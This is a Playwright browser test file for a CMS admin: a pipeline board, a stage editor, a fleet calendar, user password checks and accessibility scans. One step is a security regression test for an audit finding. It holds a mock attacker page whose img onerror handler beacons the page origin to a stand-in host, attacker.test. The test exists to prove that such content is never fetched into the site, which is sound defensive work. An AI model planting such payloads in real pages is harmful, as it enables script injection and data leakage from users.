// Kaleta browser steps 0230 (tools/test-browser.mjs runs the files of this folder in number order on one site – the order is
// the contract; tools/tests/README.md). Moved verbatim from the single file in 3.49 P1.
export default async (t) => {
  const { BASE, PASSWORD, SHOTS, MYSQL, sql, browser, context, page, watch, step, visit, AXE, WCAG, WEB_DIR, fs, execFileSync } = t;

  // 3.31 (agent B): the Pipeline board – a column per stage; a card moves with the keyboard (Space, an arrow, Space – the live
  // region announces it) and by dragging; a lost column asks for the reason in the card's own form; no sideways scroll at 1440
  // and 390 px (the columns stack on a phone), light and dark; axe clean on the board and a deal
  await step('3.31 pipeline: the board – keyboard move with an announcement, drag to Lost asks the reason; 1440 and 390 px, light/dark, axe', async () => {
    if (!MYSQL.length) { throw new Error('MYSQL_JSON is not set'); }
    sql("DELETE FROM ka_deal_stage_history WHERE deal_id IN (SELECT id FROM ka_deals WHERE title LIKE '%B331%'); DELETE FROM ka_deals WHERE title LIKE '%B331%'; DELETE FROM ka_contacts WHERE email_norm LIKE '%b331%'");
    const eva = Number(sql(`INSERT INTO ka_contacts (email, email_norm, name, phone, language, source, first_seen_at, last_activity_at, created_at, updated_at)
    VALUES ('eva.b331@northwind-b331.example', 'eva.b331@northwind-b331.example', 'Eva Longname-Doubleservice B331', '', 'en', 'manual', NOW(), NOW(), NOW(), NOW()); SELECT LAST_INSERT_ID();`).trim());
    const deal = (title, stage, value, currency, close) => Number(sql(`INSERT INTO ka_deals (title, contact_id, stage, value, currency, expected_close, created_at, updated_at)
    VALUES ('${title}', ${eva}, '${stage}', ${value === null ? 'NULL' : `'${value}'`}, ${currency === null ? 'NULL' : `'${currency}'`}, ${close === null ? 'NULL' : `'${close}'`}, NOW(), NOW()); SELECT LAST_INSERT_ID();`).trim());
    const a = deal('Website redesign B331', 'new', '12500.50', 'EUR', '2026-01-15');
    const b = deal('Yearly service plan for all three offices B331', 'new', '480.00', 'EUR', null);
    const c = deal('Logo B331', 'qualified', null, null, null);
    sql(`INSERT INTO ka_deal_stage_history (deal_id, from_stage, to_stage, at) VALUES (${a}, NULL, 'new', NOW()), (${b}, NULL, 'new', NOW()), (${c}, NULL, 'qualified', NOW())`);
    try {
      await page.setViewportSize({ width: 1440, height: 900 });
      await visit('/admin.php?module=pipeline');
      if ((await page.locator('[data-pipeline-board] section[data-stage]').count()) !== 5) { throw new Error('the board does not have the five default stages'); }
      if (!(await page.locator('section[data-stage="new"] [data-stage-sums]').innerText()).includes('€12,980.50')) { throw new Error('the sum of New in EUR is not €12,980.50'); } // 3.32 (U29): money format
      // the keyboard: the handle, Space, ArrowRight, Space – posted as JSON, the card moves, the counts and sums follow, announced
      const before = (await page.locator('[data-stage-count]').allInnerTexts()).map(Number);
      await page.locator(`#deal-${a} .obchod-uchyt`).focus();
      await page.keyboard.press('Space');
      if (!/Picked up/.test(await page.locator('[data-pipeline-announce]').innerText({ timeout: 2000 }).catch(() => ''))) { await page.waitForTimeout(200); }
      await page.keyboard.press('ArrowRight');
      await page.keyboard.press('Space');
      await page.locator(`section[data-stage="qualified"] #deal-${a}`).waitFor({ timeout: 5000 });
      await page.waitForFunction(() => /Qualified/.test(document.querySelector('[data-pipeline-announce]').textContent));
      if (sql(`SELECT stage FROM ka_deals WHERE id = ${a}`).trim() !== 'qualified') { throw new Error('the keyboard move was not saved'); }
      const counts = (await page.locator('[data-stage-count]').allInnerTexts()).map(Number);
      if (counts[0] !== before[0] - 1 || counts[1] !== before[1] + 1 || !(await page.locator('section[data-stage="new"] [data-stage-sums]').innerText()).includes('€480')) { // 3.32 (U29): the live total reads like the server's (no .00)
        throw new Error(`the counts and sums did not follow: ${before} → ${counts}`); }
      if (await page.evaluate(() => !document.activeElement.classList.contains('obchod-uchyt'))) { throw new Error('the focus did not stay on the moved card'); }
      // dragging to Lost: 3.48 B (U30) – one popover asks for the reason, focused, and the visible line says so; nothing is saved yet
      await page.locator(`#deal-${b}`).dragTo(page.locator('section[data-stage="lost"]'));
      await page.locator('[data-pipeline-reason]').waitFor({ state: 'visible', timeout: 3000 });
      if ((await page.evaluate(() => document.activeElement.id)) !== 'obchody-duvod-vyber') { throw new Error('the reason is not focused after a drop on Lost'); }
      if (!(await page.locator('[data-pipeline-message]').isVisible()) || !/lost/.test(await page.locator('[data-pipeline-message]').innerText())) { throw new Error('the board does not say visibly why it waits'); }
      if (sql(`SELECT stage FROM ka_deals WHERE id = ${b}`).trim() !== 'new') { throw new Error('a drop on Lost saved without a reason'); }
      if (SHOTS) { await page.screenshot({ path: `${SHOTS}/348-board-reason.png` }); }
      await page.selectOption('#obchody-duvod-vyber', 'timing');
      await page.locator('[data-pipeline-reason] [data-board-pop-move]').click();
      await page.locator(`section[data-stage="lost"] #deal-${b}`).waitFor({ timeout: 5000 });
      if (await page.locator('[data-pipeline-reason]').isVisible()) { throw new Error('the reason popover stays open after Move'); }
      if (sql(`SELECT CONCAT(stage, '/', lost_reason) FROM ka_deals WHERE id = ${b}`).trim() !== 'lost/timing') { throw new Error('Move with the reason did not lose the deal'); }
      if (SHOTS) { await page.screenshot({ path: `${SHOTS}/331-board.png`, fullPage: true }); }
      const state = await context.storageState();
      for (const scheme of ['light', 'dark']) {
        for (const [label, width, height] of [['desktop', 1440, 900], ['phone', 390, 844]]) {
          const other = await browser.newContext({ viewport: { width, height }, locale: 'en-GB', colorScheme: scheme, storageState: state, ...(width < 500 ? { isMobile: true, hasTouch: true } : {}) });
          const p2 = await other.newPage(); watch(p2);
          try {
            for (const url of ['/admin.php?module=pipeline', `/admin.php?module=pipeline&action=detail&id=${a}`, '/admin.php?module=pipeline&view=list&status=all']) {
              await p2.goto(`${BASE}${url}`, { waitUntil: 'networkidle' });
              const wide = await p2.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
              if (wide > 0) { throw new Error(`${wide} px of sideways scroll (${url}, ${label}, ${scheme})`); }
              if (url.endsWith('pipeline')) {
                const tops = await p2.locator('section[data-stage]').evaluateAll((els) => els.map((el) => Math.round(el.getBoundingClientRect().top)));
                if ((label === 'phone') !== (tops[1] > tops[0])) { throw new Error(`the columns ${label === 'phone' ? 'do not stack' : 'are not side by side'} (${label}, ${scheme})`); }
              }
              if (SHOTS) { await p2.screenshot({ path: `${SHOTS}/331-${url.includes('detail') ? 'detail' : url.includes('list') ? 'list' : 'board'}-${label}-${scheme}.png`, fullPage: true }); }
            }
          } finally {
            await other.close();
          }
        }
      }
      const axeContext = await browser.newContext({ storageState: state, bypassCSP: true, viewport: { width: 1440, height: 900 } });
      try {
        const axePage = await axeContext.newPage();
        for (const [url, include] of [['/admin.php?module=pipeline', ['[data-pipeline-filter]', '[data-pipeline-board]']], [`/admin.php?module=pipeline&action=detail&id=${a}`, ['[data-deal-card]', '#move', '[data-deal-history]']]]) {
          for (const scheme of ['light', 'dark']) {
            await axePage.emulateMedia({ colorScheme: scheme });
            await axePage.goto(BASE + url, { waitUntil: 'networkidle' });
            await axePage.addScriptTag({ path: AXE });
            const found = await axePage.evaluate(([inc, tags]) => window.axe.run({ include: inc.map((s) => [s]) }, { runOnly: { type: 'tag', values: tags }, resultTypes: ['violations'] }), [include, WCAG]);
            if (found.violations.length) { throw new Error(`axe ${url} (${scheme}): ` + found.violations.map((v) => `${v.id} ${v.nodes[0].target.join(' ')}`).join(', ')); }
          }
        }
      } finally {
        await axeContext.close();
      }
    } finally {
      await page.setViewportSize({ width: 1440, height: 900 });
      sql(`DELETE FROM ka_deal_stage_history WHERE deal_id IN (${a}, ${b}, ${c}); DELETE FROM ka_deals WHERE id IN (${a}, ${b}, ${c}); DELETE FROM ka_contacts WHERE id = ${eva}`);
    }
  });

  // 3.31.1 (agent A): a stage with deals keeps its kind – the editor refuses and keeps what was typed; Fleet → Calendar has the
  // certificates' reminder days next to the domains'; a rollout held back by the pilot sites for 6 days is one amber row of Today
  // with a plain link to Rollout (1440 and 390 px, light and dark, no sideways scroll, axe clean)
  await step('3.31.1: a stage with deals keeps its kind; the certificates\' reminder days; Today shows a held rollout (1440 and 390 px, light/dark, axe)', async () => {
    if (!MYSQL.length || !WEB_DIR) { throw new Error('MYSQL_JSON and WEB_DIR are not set'); }
    const deal = Number(sql("INSERT INTO ka_deals (title, stage, created_at, updated_at) VALUES ('Kind A3311', 'qualified', NOW(), NOW()); SELECT LAST_INSERT_ID();").trim());
    const version = /const KALETA_VERSION = '([^']+)'/.exec(fs.readFileSync(`${WEB_DIR}/system/bootstrap.php`, 'utf8'))[1];
    const versions = sql("SELECT IFNULL((SELECT hodnota FROM ka_nastaveni WHERE promenna = 'fleet_versions'), '')").trim();
    try {
      await page.setViewportSize({ width: 1440, height: 900 });
      await visit('/admin.php?module=pipeline&action=stages');
      await page.selectOption('tr[data-stage-row="qualified"] select[name="kind[]"]', 'lost');
      await Promise.all([page.waitForNavigation(), page.locator('form[data-stages-form] p.tlacitka button[type="submit"]').click()]);
      if (!/The kind of the stage “Qualified” cannot change while deals are in it \(1\).*It can change only when all its deals already fit the new kind/s.test(await page.locator('.hlaska-chyba').innerText())) { throw new Error('the editor does not refuse the kind change with the count and the hint'); }
      if ((await page.locator('tr[data-stage-row="qualified"] select[name="kind[]"]').inputValue()) !== 'lost') { throw new Error('the refused form lost what was typed'); }
      if (sql("SELECT IFNULL((SELECT hodnota FROM ka_nastaveni WHERE promenna = 'pipeline_stages'), '')").trim() !== '') { throw new Error('the refused stages were saved'); }
      await visit('/admin.php?module=fleet&action=calendar');
      if ((await page.locator('input[name="fleet_certificate_reminders"]').inputValue()) !== '14, 7' || (await page.locator('input[name="fleet_expiry_reminders"]').inputValue()) !== '30, 7') { throw new Error('the calendar does not offer 14, 7 for certificates and 30, 7 for domains'); }
      sql(`REPLACE INTO ka_nastaveni (promenna, hodnota) VALUES ('fleet_versions', '{"${version}":[${Math.floor(Date.now() / 1000) - 6 * 86400},false]}')`);
      for (const scheme of ['light', 'dark']) {
        await page.emulateMedia({ colorScheme: scheme });
        for (const [width, height, name] of [[1440, 900, 'desktop'], [390, 844, 'phone']]) {
          await page.setViewportSize({ width, height });
          await visit('/admin.php?module=fleet');
          const row = page.locator(`table.flotila-dnes tr[data-fleet-rollout-held="${version}"]`);
          if ((await row.count()) !== 1) { throw new Error(`Today has ${await row.count()} held-rollout rows (${name}, ${scheme})`); }
          if (!/Update rollout held back/.test(await row.innerText())) { throw new Error('the held-rollout row has no label'); }
          const wider = await page.evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth);
          if (wider > 1) { throw new Error(`Today scrolls sideways by ${wider} px at ${width} px (${scheme})`); }
          if (SHOTS) { await page.screenshot({ path: `${SHOTS}/3311-today-held-${name}-${scheme}.png`, fullPage: true }); }
        }
      }
      await page.emulateMedia({ colorScheme: 'light' });
      await page.setViewportSize({ width: 1440, height: 900 });
      await visit('/admin.php?module=fleet');
      await Promise.all([page.waitForNavigation(), page.locator('tr[data-fleet-rollout-held] td.akce a').click()]);
      if (!/action=rollout/.test(page.url()) || !(await page.locator('[data-rollout-held]').count())) { throw new Error('Open does not lead to the Rollout tab with the note on the held rollout'); }
      const state = await context.storageState();
      const axeContext = await browser.newContext({ storageState: state, bypassCSP: true, viewport: { width: 1440, height: 900 } });
      try {
        const axePage = await axeContext.newPage();
        for (const scheme of ['light', 'dark']) {
          await axePage.emulateMedia({ colorScheme: scheme });
          for (const [url, include] of [['/admin.php?module=fleet', ['table.flotila-dnes']], ['/admin.php?module=fleet&action=calendar', ['form.formular']]]) {
            await axePage.goto(BASE + url, { waitUntil: 'networkidle' });
            await axePage.addScriptTag({ path: AXE });
            const found = await axePage.evaluate(([inc, tags]) => window.axe.run({ include: inc.map((s) => [s]) }, { runOnly: { type: 'tag', values: tags }, resultTypes: ['violations'] }), [include, WCAG]);
            if (found.violations.length) { throw new Error(`axe ${url} (${scheme}): ` + found.violations.map((v) => `${v.id} ${v.nodes[0].target.join(' ')}`).join(', ')); }
          }
        }
      } finally {
        await axeContext.close();
      }
    } finally {
      await page.emulateMedia({ colorScheme: 'light' });
      await page.setViewportSize({ width: 1440, height: 900 });
      sql(`DELETE FROM ka_deal_stage_history WHERE deal_id = ${deal}; DELETE FROM ka_deals WHERE id = ${deal}; DELETE FROM ka_nastaveni WHERE promenna = 'pipeline_stages'`);
      sql(versions === '' ? "DELETE FROM ka_nastaveni WHERE promenna = 'fleet_versions'" : `REPLACE INTO ka_nastaveni (promenna, hodnota) VALUES ('fleet_versions', '${versions.replace(/'/g, "''")}')`);
    }
  });

  // 3.31.2 (N99): the collection list swaps itself only with its own page. A link inside the list to another origin (the audit's
  // proof of concept: a card element with the class of the page links) or to another path of the site is an ordinary link –
  // never fetched, nothing of its answer is put into the page. The attacker's host is answered by the test itself.
  // The step makes its own paged Collection list on /n99-list and removes it again. The card text carries the class of the
  // list's page links and a link to another origin, as a build stored before "ka-" names were reserved could (written past
  // the sanitiser on purpose).
  const n99Setup = `require "system/bootstrap.php"; $db = Kaleta\\Core\\App::boot()->db();
  $idk = $db->insert("kolekce", ["nazev" => "N99 list", "seo_link" => "n99-items", "pole" => "[]", "detail" => 0]);
  foreach ([1, 2, 3, 4, 5] as $i) { $db->insert("kolekce_polozky", ["idk" => $idk, "nazev" => "N99 item " . $i, "seo_link" => "n99-item-" . $i, "data" => "{}", "poradi" => $i, "datum" => date("Y-m-d H:i:s")]); }
  [$build] = Kaleta\\Builder\\Build::sanitize(["v" => 1, "deti" => [Kaleta\\Builder\\Build::fresh("sekce", [], [["id" => "n99l"] + Kaleta\\Builder\\Build::fresh("kolekce", ["kolekce" => "n99-items", "pocet" => 2, "strankovani" => true], [
    Kaleta\\Builder\\Build::fresh("nadpis", ["text" => "{{nazev}}"]), ["id" => "n99t"] + Kaleta\\Builder\\Build::fresh("text", ["html" => "<p><a href=\\"http://attacker.test/list\\">More</a></p>"])])])]]);
  $json = str_replace("\\"id\\":\\"n99t\\"", "\\"id\\":\\"n99t\\",\\"tridy\\":[\\"ka-kolekce-strany\\"]", Kaleta\\Builder\\Build::toJson($build));
  if (!str_contains($json, "ka-kolekce-strany")) { fwrite(STDERR, "the N99 build has no text element"); exit(1); }
  $db->insert("stranky", ["seo_link" => "n99-list", "titulek" => "N99 list", "text" => "", "v_menu" => 0, "zobrazit" => 1, "stavba" => $json]);`;
  await step('3.31.2 N99: the collection list is fetched only from its own page – a link to another origin or path is never fetched and inserted; the real page links still swap the list', async () => {
    const guest = await browser.newContext({ viewport: { width: 1440, height: 900 }, locale: 'en-GB' });
    const p = await guest.newPage();
    watch(p);
    const seen = [];
    // the planted handler reports the origin it ran in; on the attacker's own page (an ordinary navigation) that is the attacker's
    const payload = '<!doctype html><title>attacker</title><div class="ka-kolekce" data-kolekce="n99l"><img src="x" onerror="new Image().src = \'http://attacker.test/ran?in=\' + encodeURIComponent(location.origin)"><p id="n99-planted">planted</p></div>';
    await guest.route('http://attacker.test/**', (route) => {
      seen.push(`${route.request().resourceType()} ${route.request().method()} ${route.request().url()}`);
      return route.fulfill({ status: 200, contentType: 'text/html', headers: { 'Access-Control-Allow-Origin': BASE, 'Access-Control-Allow-Headers': 'x-requested-with', 'Access-Control-Allow-Credentials': 'true' }, body: payload });
    });
    const own = [];
    p.on('request', (r) => { if (r.headers()['x-requested-with'] === 'kaleta-list') { own.push(r.url()); } });
    const open = async () => {
      await p.goto(BASE + '/n99-list', { waitUntil: 'networkidle' });
      if ((await p.locator('[data-kolekce="n99l"] .ka-kolekce-strany a').count()) < 3) { throw new Error('the list has no page links'); }
    };
    try {
      execFileSync('php', ['-r', n99Setup], { cwd: process.env.WEB_DIR, encoding: 'utf8' });
      await open();
      // the stored class is not rendered: the card text is no "page links" block, only the list's own <ul> is
      const stored = await p.evaluate(() => [document.querySelectorAll('.ka-kolekce-strany').length, document.querySelectorAll('ul.ka-kolekce-strany').length, document.querySelectorAll('a[href="http://attacker.test/list"]').length]);
      if (stored[0] !== 1 || stored[1] !== 1 || stored[2] < 1) { throw new Error(`the stored "ka-" class was rendered, or the card link is missing: ${stored}`); }
      // the real page link: fetched from this page, the list swapped, the address changed without a reload
      await p.evaluate(() => { window.n99same = true; });
      await p.click('[data-kolekce="n99l"] ul.ka-kolekce-strany a:not([aria-current])');
      await p.waitForFunction(() => /[?&]s-n99l=2/.test(location.search) && document.querySelector('[data-kolekce="n99l"]').textContent.includes('N99 item 3'));
      if (!(await p.evaluate(() => window.n99same === true)) || own.length !== 1 || !own[0].startsWith(BASE + '/n99-list?')) { throw new Error(`the page link did not swap the list in place: ${JSON.stringify(own)}`); }
      // the attack with the script alone (as if the class had been rendered): a block with the page links' class and a link to the attacker
      for (const [href, lands] of [['http://attacker.test/list', 'http://attacker.test/list'], [BASE + '/contact?n99=1', BASE + '/contact?n99=1']]) {
        await open();
        own.length = 0; seen.length = 0;
        await p.evaluate((h) => {
          const block = document.createElement('p');
          block.className = 'ka-kolekce-strany';
          block.innerHTML = '<a id="n99-bait" href="' + h + '">More</a>';
          document.querySelector('[data-kolekce="n99l"]').append(block);
        }, href);
        await Promise.all([p.waitForURL(lands), p.click('#n99-bait')]);
        await p.waitForLoadState('networkidle');
        if (own.length !== 0 || (href.startsWith('http://attacker.test/') && !seen.some((r) => r.startsWith('document '))) || seen.some((r) => /^(fetch|xhr) /.test(r))) { throw new Error(`${href} was fetched by the list script: ${JSON.stringify([own, seen])}`); }
        if (seen.some((r) => r.includes('/ran?in=' + encodeURIComponent(BASE)))) { throw new Error('the planted handler ran on the site'); }
      }
      // even called with such an address, the swap does not insert the answer: the popstate path with a foreign state changes nothing
      await open();
      seen.length = 0;
      await p.evaluate(() => { history.pushState({ kolekce: 'n99l' }, '', location.pathname + '?s-n99l=3'); window.dispatchEvent(new PopStateEvent('popstate', { state: { kolekce: 'n99l' } })); });
      await p.waitForFunction(() => document.querySelector('[data-kolekce="n99l"]').textContent.includes('N99 item 5'));
      if (await p.locator('#n99-planted').count() !== 0 || seen.length !== 0) { throw new Error('the list took content from elsewhere'); }
    } finally {
      await guest.close();
      sql("DELETE FROM ka_kolekce_polozky WHERE seo_link LIKE 'n99-item-%'; DELETE FROM ka_kolekce WHERE seo_link = 'n99-items'; DELETE FROM ka_stranky WHERE seo_link = 'n99-list'");
      execFileSync('sh', ['-c', 'rm -f "$WEB_DIR"/storage/cache/stranky/*.html'], { env: process.env });
    }
  });

  // 3.31.2 (pre-release review): one's own account in Users has no e-mail, password or two-factor fields (My account asks for the
  // current password); another account's new password needs the administrator's own current password
  await step('3.31.2 review: Users – the own form points to My account; a new password for another user asks for the administrator\'s password', async () => {
    await visit('/admin.php?module=users&action=edit&id=1');
    if (await page.locator('#password, #soucasne, input[name="totp_reset"], input[name="email"]').count() !== 0) { throw new Error('the own form still offers the e-mail, a password or the two-factor reset'); }
    if (!(await page.locator('#email').isDisabled()) || !(await page.locator('.napoveda a[href*="action=account"]').count())) { throw new Error('the own form does not point to My account'); }
    sql("INSERT INTO ka_uzivatele (user, password, jmeno, email, jazyk, admin, posledni_login, potvrzeno, blokovat) VALUES ('b3312', 'x', 'B3312', '', '', 0, NOW(), NOW(), 0)");
    const id = sql("SELECT idu FROM ka_uzivatele WHERE user = 'b3312'").trim();
    try {
      await visit(`/admin.php?module=users&action=edit&id=${id}`);
      await page.fill('#password', 'New-password-3312');
      await Promise.all([page.waitForNavigation(), page.locator('form.formular input[type="submit"]').first().click()]);
      if (!(await page.locator('#soucasne ~ .chyba-pole').count()) || sql(`SELECT password FROM ka_uzivatele WHERE idu = ${id}`).trim() !== 'x') { throw new Error('a new password was saved without the administrator\'s password'); }
      await page.fill('#password', 'New-password-3312');
      await page.fill('#soucasne', PASSWORD);
      await Promise.all([page.waitForNavigation(), page.locator('form.formular input[type="submit"]').first().click()]);
      if (sql(`SELECT password <> 'x' FROM ka_uzivatele WHERE idu = ${id}`).trim() !== '1') { throw new Error('the new password was not saved with the administrator\'s password'); }
    } finally {
      sql(`DELETE FROM ka_uzivatele_prava WHERE fk_id_user = ${id}; DELETE FROM ka_uzivatele WHERE idu = ${id}`);
    }
  });
};
